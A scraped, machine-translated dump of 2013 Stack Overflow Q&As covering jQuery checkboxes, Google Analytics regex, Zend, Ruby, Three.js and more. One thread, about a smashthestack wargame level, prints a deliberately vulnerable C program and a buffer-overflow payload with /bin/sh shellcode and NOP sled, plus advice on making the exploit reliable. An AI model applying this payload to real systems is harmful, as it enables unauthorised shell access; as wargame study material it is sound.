**更新** 但您可以将其简化为

```
$(function(){
    $('#selectall').click(function(i, v){
        $('.selectedId').prop('checked', this.checked);
    });

    var checkCount = $('.selectedId').length;
    $('.selectedId').click(function(i, v){
        $('#selectall').prop('checked',$('.selectedId:checked').length  == checkCount)
    });
}); 
```

`onclick`并从输入元素中删除所有处理程序，如[本演示所示](http://jsfiddle.net/Dsjwn/2/)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-04-08T13:09:12.337

用这个...

```
$('#selectall').on('click', function() {
    $('.selectedId').attr('checked', $(this).is(":checked"));
}); 
```

看这个[**DEMO**](http://jsfiddle.net/K9P8A/14/)

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2013-10-01T10:20:36.240

```
$(document).ready(function () {
    $('#selectall').click(function () {
        $('.selectedId').prop('checked', $(this).is(":checked"));
    });
});

more Optimized 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-08T13:02:25.617

这应该为您解决问题。

```
$(document).ready(function () {
    $('#selectall').click(function () {
         var checked = $(this).is(':checked');            
        $('.selectedId').each(function () {
            var checkBox = $(this);               
            if (checked) {
                checkBox.prop('checked', true);                
            }
            else {
                checkBox.prop('checked', false);                
            }
        });

    });
}); 
```

JsFiddle [http://jsfiddle.net/Ra3uL/](http://jsfiddle.net/Ra3uL/)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-08-05T11:24:15.173

假设父复选框有一个主选择类，所有子复选框都有一个子选择类

然后选择 parent 将选择所有复选框，反之亦然，代码如下：

```
$('#mainselect').live('change',function(){
if($(this).attr('checked') == 'checked') {
    $('.childselect').attr('checked','checked');
} else {
    $('.childselect').removeAttr('checked');
}
}); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-09-03T09:32:45.207

$(函数(){

```
// add multiple select / deselect functionality
$("#selectall").click(function () {
      $('.case').attr('checked', this.checked);
});

// if all checkbox are selected, check the selectall checkbox
// and viceversa
$(".case").click(function(){

    if($(".case").length == $(".case:checked").length) {
        $("#selectall").attr("checked", "checked");
    } else {
        $("#selectall").removeAttr("checked");
    }

}); 
```

});

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2015-03-03T18:35:31.550

如果您的复选框具有与单击事件关联的特定处理，则对 @letiagoalves 解决方案进行了小幅增强。OP没有要求，但我过去必须做的事情。基本上，它不是直接设置每个依赖复选框的选中属性，而是将每个依赖复选框的选中状态与全选复选框进行比较，并对处于相反状态的复选框触发点击事件。

```
$('#selectall').click(function () {
    var parentState = $(this).prop('checked');
    $('.selectedId').each(function() {
        if ($(this).prop('checked') !== parentState) {
            $(this).trigger("click");
        }
});
}); 
```

演示： [https ://jsfiddle.net/jajntuqb/2/](https://jsfiddle.net/jajntuqb/2/)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2015-06-22T22:18:10.343

您可以简单地将句柄功能添加到全选复选框上的单击事件：

```
$('#chk-all-items').click(selectAll); 
```

然后这个功能应该足以全选或取消全选。

```
selectAll = function (event) {
        var self = this;
        $('.template-item-select').each(function () {
            this.checked = self.checked;
        });
    } 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2016-09-16T22:34:02.197

更具体的解决方案：

```
$(document).ready(function(){
  $('#checkAll').on('click', function ( e ) {
    $('input[name="chck_box[]"]').prop('checked', $(this).is(':checked'));
  });
});
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<table>
  <thead>
    <th><input type="checkbox" id="checkAll"></th>
    <th>Name</th>
    <th>Last</th>
  </thead>
  <tbody>
    <tr>
      <td><input type="checkbox" name="chck_box[]" value="1"></td>
      <td>Joe</td>
      <td>Doe</td>
    </tr>
    <tr>
      <td><input type="checkbox" name="chck_box[]" value="2"></td>
      <td>John</td>
      <td>Smith</td>
    </tr>
    <tr>
      <td><input type="checkbox" name="chck_box[]" value="3"></td>
      <td>Bill</td>
      <td>White</td>
    </tr>
  </tbody>
</table>
```

# regex - 是否可以组合出现在 Google Analytics 中的不同 URL？

> ID：15879611
> 
> 赞同：1
> 
> 时间：2013-04-08T12:55:12.023
> 
> 标签：regex, url, google-analytics

我们网站中有一些 URL 被 GA 记录的不同，我相信这主要是由于浏览器类型。问题是由于某些 URL 来自我们网站的某个区域，我们目前无法在不付出巨大努力的情况下更改这些 URL，其中包含空格。通过不同浏览器处理空格的方式，我们可以将各种格式记录为单独的项目：

*   \我的站点区域\pages\default.html
*   \my+site+area\pages\default.html
*   \my%20site%20area\pages\default.html

我认为使用正则表达式并尝试简化这些可能很有用。

有没有人遇到过类似的问题，你解决了吗？理想情况下，我希望将上述所有 URL 作为一个 URL 进行跟踪，现在它在我的报告中显示为多个 URL，这会扭曲我们必须进行的一些跟踪，或者在能够组合这些 URL 时产生额外的工作是一样的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:35:25.257

为此，您可以创建一个新的配置文件，然后创建并应用一些[搜索和替换过滤器](http://support.google.com/analytics/answer/1034834?hl=en)来处理重写 URL。

在上面的示例中，您的搜索字符串可以是：

```
\/my(\s|\+|%20)site(\s|\+|%20)area\/pages\/default\.html 
```

然后您的替换字符串可以是您选择的任何格式，例如：

```
\/my site area\/pages\/default\.html 
```

这会将三种格式中的任何一种映射到“/my site area/pages/default.html”

# json - 这是有效的 json. 我找不到罪魁祸首在哪里？

> ID：15879616
> 
> 赞同：0
> 
> 时间：2013-04-08T12:55:25.760
> 
> 标签：json

无效的 JSON 数据

```
{"broadcastId":"107040605846","channelId":"3EC40265-8F54-40AA-8576-D92DC0CEA080","channelName":"RTL","startDateTime":"2013-04-08 19:05:00","endDateTime":"2013-04-08 19:40:00","genre":"Serie","ageRating":"0","lengthPlain":"0","voteHumor":"0","voteAnspruch":"0","voteAction":"0","voteSpannung":"0","voteErotic":"0","country":null,"year":"0","title":"Alles was z\u00e4hlt","subtitle":"Folge 1658","description":"(1658)
Simones Widerstand gegen\u00fcber David br\u00f6ckelt. Als sich die beiden erneut k\u00fcssen, werden sie dabei prompt beobachtet... Hart f\u00fcr Ingo: Er hat seine Chance bei Bea gehabt und sie verpasst.","artists":null,"picLink":null,"isTip":"0"} 
```

# javascript - 如何在点击功能上创建文本框

> ID：15879618
> 
> 赞同：0
> 
> 时间：2013-04-08T12:55:29.767
> 
> 标签：javascript, html, javascript-events

我正在尝试在按钮单击功能上创建 2 个文本框和 1 个选择框，但是当我填充由 1 次单击创建的框时，在另一次单击时，所有填充的细节都消失了。

我希望我填写的详细信息能够发布到数据库中吗？

```
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
        <title>Untitled Document</title>
        <script>
            var counter=1;
            function generateRow() {
                var d=document.getElementById("div");
                d.innerHTML+="<p>&nbsp;&nbsp;&nbsp;&nbsp;<div class='_25'><input type='textbox' id='textbox"+counter+"' name='stop"+counter+"' placeholder='Stop Name'></input></div>&nbsp;&nbsp;&nbsp;<div class='_25'><input type='textbox' id='textbox"+counter+"' name='timing"+counter+"' placeholder='Timing'></input></div>&nbsp;<div class='_25'><strong>Select Route</strong><select id='ampm"+counter+"'name='ampm"+counter+"'><option>a.m</option><option>p.m</option></select>  </div>";
                counter++;
            }
        </script>
    </head>
    <body>
        <form id="form1" name="form1" method="post" action="">
            <div id="div"></div>
            <p><input type="button" value="Add" onclick="generateRow()"/></p>
            <p>
        </form>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:07:09.023

你可以试试这种方式

```
var temp ="'<p>&nbsp;&nbsp;&nbsp;&nbsp;<div class='_25'><input type='textbox' id='textbox"+counter+"' name='stop"+counter+"' placeholder='Stop Name'></input></div>&nbsp;&nbsp;&nbsp;<div class='_25'><input type='textbox' id='textbox"+counter+"' name='timing"+counter+"' placeholder='Timing'></input></div>&nbsp;<div class='_25'><strong>Select Route</strong><select id='ampm"+counter+"'name='ampm"+counter+"'><option>a.m</option><option>p.m</option></select>  </div>'";

var newdiv = document.createElement('div');
newdiv.innerHTML = temp;
var yourDiv = document.getElementById('div');
yourDiv.appendChild(newdiv); 
```

希望它会工作

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:07:09.133

首先`d.innerHTML`进入另一个变量和另一个变量中的新html。然后将它们连接起来并保存在`innerhtml`

但是，您应该使用`insertBefore`or`appendChild`功能而不是简单的`innerHTML`.

# adobe - 如何使用 Photoshop 脚本调整图像文件的大小

> ID：15879619
> 
> 赞同：0
> 
> 时间：2013-04-08T12:55:30.633
> 
> 标签：adobe, photoshop, photoshop-script

我想将一个图像文件调整为两个不同大小的图像：240pxX240px、1024pxX1024px，我还想保持纵横比。如何使用 Photoshop 脚本执行此操作？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T15:46:59.633

您可以使用 Ps 编写一个简单的操作，使用 File->Automate->Fit Image... 命令来调整大小。

要创建动作...

1.  打开动作面板：Window->Actions。

2.  ![在此处输入图像描述](https://i.stack.imgur.com/NBoay.png)然后通过单击操作面板底部的创建新操作。

3.  为您的操作命名，当您看到录制按钮为红色时，![在此处输入图像描述](https://i.stack.imgur.com/mZ0Fm.png)您正在录制，因此每次运行操作时不要做任何您不想做的事情。

4.  选择 File->Automate->Fit Image... 将 1024 设置为高度，1024 设置为宽度，然后单击`OK`

5.  选择文件->另存为并选择一个空文件夹来保存它们，不要更改文件的名称，这样您就可以在整个图像文件夹上运行此操作，而不会在每次操作时覆盖它们正在运行。

6.  重复步骤 4，但高度和宽度都使用 240。

7.  另存为到*新文件夹*（同样，不要更改文件名）

8.  关闭文件而不保存。

9.  ![在此处输入图像描述](https://i.stack.imgur.com/GIs1j.png)在操作面板底部点击停止

10.  现在，使用 Bridge，浏览到包含图像的文件夹，然后选择要以这种方式调整大小的图像。

11.  选择工具->Photoshop->批处理。

12.  从操作下拉列表中选择您刚刚创建的操作，然后单击`OK`

Photoshop 现在将打开每个文件，将图像调整为 1024x1024，保存，将其调整为 240x240，保存，关闭原始文件，然后重复在 Bridge 中选择的下一张图像。它将继续，直到它处理完您选择的所有图像。

# ruby-on-rails - 为非会员用户隐藏图片

> ID：15879627
> 
> 赞同：0
> 
> 时间：2013-04-08T12:55:50.290
> 
> 标签：ruby-on-rails, performance, caching, webserver, privacy

我有一个网站，用户可以在其中上传图片并将每张图片的隐私设置设置为“公开可见”、“会员可见”或“朋友可见”。当图像设置为“成员可见”时，所有未登录的用户都会看到一些“禁止，注册”图像。当它是“朋友可见”时，所有非朋友都会看到“禁止”的。

实现这一目标的最佳方式（就资源友好/最快而言）是什么？

目前，我在我的 html 中有一个通用链接到一个图像资源，比如`<img src="/images?image_id=1234">`登录和未登录的用户。

My`/image`是一个脚本，它在数据库中查找当前用户（通过 cookie）和图像元数据（通过 image_id），比较用户的访问权限，然后发送实际图像或“禁止”图像。这里的问题：每次加载图像时都会调用脚本并产生一些我想避免的开销。

我想让所有图像在服务器上都是静态的，并由某种静态哈希 URL 调用。这样就不必每次都触发臃肿的脚本。但我还想阻止用户复制该静态图像链接并将其发送给其他（未登录的）用户（默默无闻没有安全性！）。另一个问题是我需要确保只有朋友才能看到“朋友可见”的图像。

您对此有何经验？欢迎任何想法！

PS：我正在使用 Ruby on Rails、Mysql、Apache、Redis，但欢迎通用解决方案，这就是我没有添加技术相关标签的原因。

# sql - 这个电影数据库模型是否正确且高效？

> ID：15879632
> 
> 赞同：3
> 
> 时间：2013-04-08T12:56:00.947
> 
> 标签：sql, database, database-design

这是我的架构：

![在此处输入图像描述](https://i.stack.imgur.com/PiZnv.png)

我需要保持简单，因为这是一项家庭作业，但我对 Participant 和 MovieInGenre 实体有点困惑，因为我知道它们是弱实体，但 Person 和 Genre 以及 Movie 是强实体。此外，该模型如何表明电影 - 类型关系是 n:n？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T12:58:50.653

在我自己看来，架构很好。有一点变化。我认为您需要删除 table`IMDBLink`并将`Link`（*使其为 NULLABLE*）放在 table 上`Movie`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T17:38:55.197

您的架构对我来说看起来不错。

我不确定您对 Participant 和 MovieInGenre 有什么顾虑。您需要这些实体来创建多对多关系。

每当您有三个带有 A <- M:1 -> B <- 1:M -> C 的表时（如果您看到我在没有绘制图表的情况下在那里写的内容），则表明 A/C 关系是M:M 和 B 的存在只是为了实现这种关系。您还可以绘制图表，省略 MovieInGenre 之类的表格，直接显示 Movie 和 Genre 之间的 M:M 关系。在某些时候，您需要创建表来实现关系，但您不需要在图表上显示它。我通常不会在我的图表中包含这些实体，因为它们只是杂乱无章。

“角色”是什么意思。如果“角色”是该人扮演的角色的名称，那么这很好。如果角色类似于“导演”、“制片人”、“演员”等，即从标准值列表中选择，那么应该有另一个表，您只需发布一个外键。如果两者兼而有之，那么这是一个坏主意，应该将其分为两个领域。

# c++ - 在新线程中处理类时的内存分配问题

> ID：15879640
> 
> 赞同：0
> 
> 时间：2013-04-08T12:56:21.637
> 
> 标签：c++, multithreading, class, memory, allocation

我有这样的代码和平：

```
#include "Item.h"
#include "Object.h"

int main(){

    Item Pan(0);

    Pan.Prep2Cook();

    //Object(char*, int);

    Object Drawer(Pan.Oil_Memory, Pan.Oil_Size);

    Drawer.Search();

    Pan.OilId = Drawer.Oil();

    Pan.Finish_Cooking();

    return 0;
} 
```

它按预期工作，但如果我将其更改为：

```
#include "Item.h"
#include "Object.h"

DWORD WINAPI Cooky(LPVOID);

int main(){

    // tried changing to 1000000000, still gives the error...
    // tried changing to 0, still gives the error...

    CreateThread(0,100000,Cooky,LPVOID(0),0,0);

    /*...
    Do_Other_Stuff();
    ...*/

    return 0;
}

DWORD WINAPI Cooky(LPVOID lParam)
{

    Item Pan(int (lParam) );

    Pan.Prep2Cook();

    Object Drawer(Pan.Oil_Memory, Pan.Oil_Size);//memory allocating error here

    Drawer.Search();

    Pan.OilId = Drawer.Oil();

    Pan.Finish_Cooking();

    return 0;

} 
```

在“抽屉”类中分配内存时会出现问题，如下所示：

```
data1 = new unsigned char[size];//error here

data2 = new unsigned char[size2];

all_data = new unsigned char*[9]; 
```

# 编辑： size 和 size2 等于或小于 10000。

我尝试使用 Createthread 中的 dwStackSize 参数“操纵”，但它仍然给我错误...

欢迎任何有关如何解决此错误的建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:14:11.163

用这么少的代码很难说出你的错误是什么，但这里有一些你可能需要考虑的事情

你的主线程实际上在做什么

```
/*...
Do_Other_Stuff();
...*/

return 0; //this will immediatly end every single thread 
```

重要的是，如果您尝试按原样运行代码，您的主线程将结束并退出您的程序，如果您的程序似乎在您未能分配内存时崩溃，这可能是因为它是您线程中的一项重要操作并且您的程序退出当您尝试分配内存时

其次，你分配给你的线程的堆栈大小是无关紧要的，因为分配失败是在堆上（因为你使用`new`），而且分配给很多堆栈可能会阻碍分配，因为你只有有限的内存（但这可能不是问题 ）

# c - 程序在 GDB 中的行为不同？

> ID：15879646
> 
> 赞同：0
> 
> 时间：2013-04-08T12:56:37.083
> 
> 标签：c, stack-overflow, shellcode

我从[smashthestack](http://smashthestack.org)得到这段代码：

```
//bla, based on work by nnp

#include <stdio.h>
#include <string.h>

void prompt_name(char *name, char *msg){
        char buf[4096];

        int i = 0;
        puts(msg);
        i = read(0, buf, sizeof buf);
        printf("Read %d bytes\n", i);
        *strchr(buf, '\n') = 0;
        strncpy(name, buf, 20);
}

void prompt_full_name(char *fullname) {
        char last[20];
        char first[20];

        prompt_name(first, "Please enter your first name: ");
        prompt_name(last, "Please enter your last name: ");

        strcpy(fullname, first);
        strcat(fullname, " ");
        strcat(fullname, last);
}

int main(int argc, char **argv){
        char fullname[42];

        prompt_full_name(fullname);
        printf("Welcome, %s\n", fullname);

        return 0;
} 
```

[我使用这个shellcode](http://www.shell-storm.org/shellcode/files/shellcode-841.php)执行这个程序：

```
python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 2009 + "\x90" * 2065 + "\n" + "\x80\xec\x02\xf4\xff\xbf\x03\xf4\xff\xbf\x04\xd4\xff\xbf\xa6\xfc\xff\xbf\xff" + "\n"' > /tmp/in 
```

在 GDB`run < /tmp/in`中，一切正常： (gdb) run < /tmp/wliao_in

```
Starting program: /levels/level06 < /tmp/wliao_in
Please enter your first name: 
Please enter your last name: 
Welcome, j
          X�Rh//shh/bin��1�̀��������������� ����������������
Executing new program: /bin/bash 
```

但实际上，它不是：

```
level6@io:/levels$ cat /tmp/in | ./level06
Please enter your first name: 
Please enter your last name: 
Welcome, j
          X�Rh//shh/bin��1�̀��������������� ����������������
Illegal instruction 
```

我不明白这两者有什么不同？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:31:32.843

在 GDB 内外运行某些东西时会出现很多问题。

首先，环境发生了变化，如此差异所示。添加和删​​除环境变量会更改堆栈上所有内容的地址。

```
< _=./envp2
---
> COLUMNS=91
8a9
> LINES=39
20a22
> _=/usr/bin/gdb 
```

其次，execve 路径会影响堆栈布局（您使用的是“./level06”，但 GDB 使用的是绝对路径“/levels/level06”）。这可能同时出现在 argv[1] 和堆栈底部（我不知道为什么，但 Linux 会这样做）。

自从我完成那个级别以来已经很长时间了，但是我会尝试将 shellcode 放在命令行参数中（因此没有大小限制），并带有大量的 NOP 雪橇（因此堆栈地址的更改不会产生影响您的漏洞利用是否有效）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:20:20.003

`prompt_name`如果名称超过 20，则不会产生由字符`name`终止的`\0`字符。在 gdb 中运行时的区别在于，在 gdb 内存和堆栈管理中可能会有所不同，在这种情况下，两个字符串可能会意外地以`\0`.

对于小于 20 个字符的名称，它适用于我。

# visual-studio-2010 - TFS - 强制所有开发人员签入他们的代码

> ID：15879649
> 
> 赞同：1
> 
> 时间：2013-04-08T12:56:43.027
> 
> 标签：visual-studio-2010, visual-studio, tfs, checkin

在 Visual Studio 和 TFS 中有没有一种方法可以强制开发人员签入他们的代码？或提醒他们始终签入他们的代码？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-08T13:36:16.947

您无法强制签入其他工作区中的文件。签出的文件仅存在于工作区所在的本地驱动器上，因此如果机器关闭，则无法访问文件。

但是您可以识别已签出的文件，并通知用户。使用 tf.exe，您应该能够获得为所有用户签出的所有文件的列表，如下所示：

```
tf status /user:* 
```

您可以通过提供路径和 /r 来限制范围以获取所有项目。

```
tf status /user:* $/TeamProject/Project/ /r 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T09:46:59.673

虽然无法强制进行此类签入，但您可能会创建一个新用户，该用户将有权访问在其他系统上签出的所有文件（假设这些系统正在运行）。因为 TFS 知道谁签出了哪个文件。

然后，您可以将签出的文件复制到本地工作区并签入。这听起来比实际要容易得多。您可能会遇到很多合并冲突，当有人从 TFS 获取最新版本时，他们也会遇到这些合并冲突（更不用说他们自己的更改将被视为合并冲突）。

我相信 TFS 可以配置为每个文件只允许一次签出。这将解决很多问题，但会限制开发人员。

所以简而言之，有解决方案。但是让开发人员检查他们自己的工作可能会更好，而不是远程强制它可能带来的所有麻烦。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T11:02:03.177

入住是流程的一部分。如果流程的其他部分已经到位，那么签入的需求将变得显而易见，而开发人员会这样做。

例如：如果您设置了一个自动构建，它构建了所有签入的内容，并在 QA/release/etc 中使用该构建。然后开发人员必须签入，否则他们的代码将不在该版本中。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-11T21:23:38.250

使用团队基金会伙伴解锁文件、删除工作区。没有办法强制开发人员签入他们的文件。

# asp.net-mvc - ASP.NET MVC Mobile View 有不同的视图模型

> ID：15879654
> 
> 赞同：0
> 
> 时间：2013-04-08T12:56:50.570
> 
> 标签：asp.net-mvc, mobile

以下页面是我网站的默认页面：Dashboard.cshtml、Dashboard.Mobile.cshtml。用户可以使用 NuGet 中的 ViewSwitcher 从标准页面切换到移动页面。

但是，我的移动页面的视图模型与标准页面不同。

目前，我通过将两个视图模型放在同一个类中快速修补它，并且操作方法如下所示：

```
public ActionResult Dashboard()
{
    return this.HttpContext.GetOverriddenBrowser().IsMobileDevice
        ? this.GetMobileDashboardViewModel()
        : this.GetDesktopDashboardViewModel();
} 
```

我觉得这会让我在代码审查中被同行杀死。在移动页面和标准页面具有不同视图模型的情况下，是否有更合适的方法来处理这种情况？

干杯，

埃里克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:26:57.317

如果它们不是相同的逻辑，则它们不应该具有相同的控制器方法。它是如此简单。通常，使用移动设备您最终会丢弃一些数据，这没关系。因此，如果您只能使用桌面视图模型，请这样做。

对于仪表板之类的东西，您可能无论如何都想使用部分视图，这样您只需要提取您需要的内容并且可以具有一些灵活性。

# ruby - to_s && 包括？涉及继承的问题

> ID：15879656
> 
> 赞同：0
> 
> 时间：2013-04-08T12:56:53.483
> 
> 标签：ruby, inheritance, output

我来自 Java 和一些 C++，并且正在通过创建二十一点游戏来学习（一些）红宝石。我正在仔细阅读这个程序以了解 ruby​​ 的真正工作原理。

手头的代码是：

```
class Card
  include Comparable
  include Enumerable
  attr_accessor :value
  def initialize(v)
    @value = v
  end
  def <=>(other)
    if other.is_a?(Card)
      @value <=> other.value
    else
      @value <=> other
    end
  end
  def each
    yield @value
  end
  def to_s
    "#{@value}"
  end
end

class Hand <  Card
  include Enumerable
  attr_accessor :hand
  def initialize
    @hand = Array.new()
  end
  def clear_hand
    @hand.clear
  end
  def add_to_hand(c)
    if c.is_a?(Card)
      @hand << c
    else
      raise "We have a problem - we received a non card object into our hand"
    end
  end
  def each
    @hand.each do |card|
      yield card
    end
  end
  def to_s
    @hand.each do |c|
      puts c
    end
  end
end

c1 = Card.new(3)
c2 = Card.new(0)
p = Hand.new()
p.add_to_hand(c1)
puts c1 # => 3
puts p  # => 3 \n(new line) #<Hand:0x00000002b01ba0>
puts [1,2,3,4,5].include?(c1)  # => true
puts [1,2,3,4,5].include?(p)   # => false 
```

我的问题：

为什么，当我使用“puts p”时，我会得到一个 ObjectID 以及预期值“3”。它只对数组执行此操作（或者这就是我到目前为止所注意到的，但我确信还有其他情况它还返回 ObjectID）。有人可以解释为什么。

最后一行（当我们得到错误输出时）我希望它返回 true - 这是因为我有一个手，里面装满了卡片（此时只有一张），并且它确实包含带有值的卡片3\. 所以，我不知道我的代码有什么问题导致它返回 false - 我产生了“手”的每张卡片，我认为应该通过使用卡片的每个语句产生该值？

如果这不清楚，请告诉我！提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:06:18.347

它打印出您的对象，因为该[`Array#each`](http://www.ruby-doc.org/core-2.0/Array.html#method-i-each)方法返回对象本身。如果您只想返回`Hand`简单地返回数组中的卡片，或者返回连接的版本：

```
def to_s
  @hand.join("\n")
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:27:52.540

[`Object#to_s`](http://www.ruby-doc.org/core-2.0/Object.html#method-i-to_s)说：返回一个表示 obj 的字符串。默认`to_s`打印对象的类和对象 id 的编码。

现在，如果您执行以下操作：

```
p Hand.ancestors 
#=> [Hand, Card, Enumerable, Comparable, Object, Kernel, BasicObject] 
```

由于您没有定义`to_s`任何类`Hand`，`Card`因此`Object#to_s`由`puts`. 只是为了证明它在你的`Hand`类中放置下面的代码：

```
 def to_s
   "I am Hand class Object"
  end 
```

现在调用`puts p`，你会看到输出：`I am Hand class Object`。

但是[`Array#to_s`](http://www.ruby-doc.org/core-2.0/Array.html#method-i-inspect)重载了`Object#to_s`. 因此打印不同的输出。

*现在来到你的第二个困惑：*

[`Array#include?`](http://www.ruby-doc.org/core-2.0/Array.html#method-i-include-3F)说——

> 如果给定对象存在于 self 中（即，如果任何对象 == 对象），则返回 true，否则返回 false。

这意味着在您的情况下，数组`[1,2,3,4,5]`包含`Fixnum`对象。因此[`Fixnum#==`](http://www.ruby-doc.org/core-2.0/Fixnum.html#method-i-3D-3D)将被调用。***如果 fix 在数字上等于 other，则***`Fixnum#==`表示返回 true。. 但是您的类对象不满足上述条件，对于每个调用，例如，等等，因此已返回值。*`p``Hand``1==p``2==p``false`*

 *希望它可以帮助您理解这个概念。*

# html - 在jsp中显示带有struts 2的字符串数组

> ID：15879667
> 
> 赞同：0
> 
> 时间：2013-04-08T12:57:32.610
> 
> 标签：html, jsp, struts2, pre

我想在jsp上显示字符串数组。下面是我写的代码：

```
<s:iterator value="ccActivityOperationVO.output" var="Output">
    <s:property value="#Output"/><br/>
</s:iterator> 
```

使用此代码，我可以打印字符串数组，但我会丢失文本前后的空格等格式。注意：我没有使用任何类型的修剪。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:20:13.513

将`<pre>`标签包裹在值周围。它保留了空白。

```
<s:iterator value="ccActivityOperationVO.output" var="Output">
    <pre><s:property value="#Output"/></pre><br/>
</s:iterator> 
```

在 HTML 头部添加以下样式

```
<style type='text/css'> pre {display: inline;} </style> 
```

# frameworks - 在编辑模式zend中将密码留空

> ID：15879673
> 
> 赞同：1
> 
> 时间：2013-04-08T12:57:36.967
> 
> 标签：frameworks, passwords, zend-framework2, edit, validation

是否可以设置以下选项：

需要添加用户的时候需要设置密码，但是去编辑用户的时候就不需要设置密码了。

但是当您在编辑模式下将密码留空时。它不应该覆盖现有的密码。

我如何在 Zend 框架 2.0 中解决这个问题？

编辑：

也许最好显示一些代码。我在密码字段上设置了以下验证器：

```
 $inputFilter->add($factory->createInput(array(
            'name' => 'password',
            'required' => true,
            'filters' => array(
                array('name' => 'StripTags'),
                array('name' => 'StringTrim'),
            ),
            'validators' => array( array(
                    'name' => 'StringLength',
                    'options' => array(
                        'encoding' => 'UTF-8',
                        'min' => 4,
                        'max' => 30,
                    ),
                ), ),
        )));

        $inputFilter->add($factory->createInput(array(
            'name' => 'confirm_password',
            'required' => false,
            'filters' => array(
                array('name' => 'StripTags'),
                array('name' => 'StringTrim'),
            ),
            'validators' => array(
                array(
                    'name' => 'StringLength',
                    'options' => array(
                        'encoding' => 'UTF-8',
                        'min' => 4,
                        'max' => 30,
                    ),
                ),
                array(
                    'name' => 'identical',
                    'options' => array('token' => 'password')
                ),
            ),
        ))); 
```

工作正常，但当我在编辑模式下将其留空时就不行了。但它在我的添加模式中是必需的。如何在我的编辑模式下接受空密码字段，而不清除该用户的现有密码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-21T12:56:56.607

你可以试试这段代码：

```
if ($this->getRequest()->isPost()) {
  $form->setData($this->getRequest()->getPost());

  if ($form->get("password")->getValue() == ""){
    $form->getInputFilter()->remove('password');
    $form->getInputFilter()->remove('password_r');
  }  

  if ($form->isValid()) {
     // ...
  }
  // ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T13:55:58.453

为什么不只是将需要密码的布尔值传递给验证方法，将其与您当前的验证规则结合使用意味着它将在需要时运行验证。控制器还可以检测是否设置了来自该页面的发布/获取值并相应地更改该布尔值。

它不是最好的方法，可能有一些奇特的 Zend 方法可以做到这一点，但手册不会涵盖它，哈哈

例子

```
public function validate($passRequired = false)
{
    if ($passRequired) {
        //now run the validation
    }
} 
```

# three.js - 在 Three.js 中加载大量对象的最快方法？

> ID：15879675
> 
> 赞同：1
> 
> 时间：2013-04-08T12:57:40.710
> 
> 标签：three.js, webgl

我目前正在探索优化在 Three.js 中加载/生成大量对象的时间的方法。这些对象的输入是构成 2D 足迹的各个顶点。

我使用的初始方法是`THREE.Shape`从各个顶点创建对象，然后使用`THREE.ExtrudeGeometry`将 2D 形状拉入 3D 对象。对所有对象执行此操作大约需要 3500 毫秒。

我探索的第二种方法是使用[JSON 模型格式](https://github.com/mrdoob/three.js/wiki/JSON-Model-format-3.1)将生成的 3D 对象（从前一种方法）预导出到 JSON 文件中，然后在需要时导入该 JSON 文件，而不是在运行时生成对象。仅此 JSON 表示的导入和加载大约需要 3800 毫秒，这比在运行时生成对象还要长！

我想知道在 Three.js 中加载/生成对象的最快方法是什么。我不知道如何加快`THREE.Shape`和挤压方法，我不确定为什么 JSON 导入方法这么慢（我认为预先生成几何图形会节省很多时间）。

有没有其他方法可以加快速度？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:36:58.387

我对你的结果一点也不感到惊讶。我敢打赌，您还可以使用自定义几何图形获得更大的内存占用......

BufferedGeometry 肯定会加快加载自定义几何图形。但我不确定你会比动态生成几何图形更快。生成的好处是您可以为过程设置动画，以便用户看到场景在他们面前栩栩如生。您可以分解您的自定义几何体并执行类似于我们在 Verold Studio 中加载多部分对象时所做的事情，以提供类似的效果，但您将对生成的场景进行更多控制。

我还建议您在基准测试中查看内存、CPU 和网络速度。针对您的特定配置进行优化可能会导致您走上一条获得出色性能的道路，但对您的用户却不是。在方法上肯定存在权衡，您可以在服务器上进行更多的预计算以换取更多的网络流量等。确保您独立测量所有因素 - 而不仅仅是配置的速度。

# zend-framework2 - 文件上传的编辑操作

> ID：15879679
> 
> 赞同：0
> 
> 时间：2013-04-08T12:57:54.460
> 
> 标签：zend-framework2

按照[教程](http://samsonasik.wordpress.com/2012/08/31/zend-framework-2-creating-upload-form-file-validation/)，我能够很好地创建文件上传，并且根据 zend 教程，editAction 与 Add 操作几乎相同。

如果我不在 editAction 中添加文件上传代码，它工作正常，但添加文件上传后，exchangearray() 中显示错误

不能在第 20 行的 \module\report\src\report\Model\CompanyReport.php 中使用类型为 \Model\CompanyReport 的对象作为数组

这是模型文件

```
public function exchangeArray($data)
{
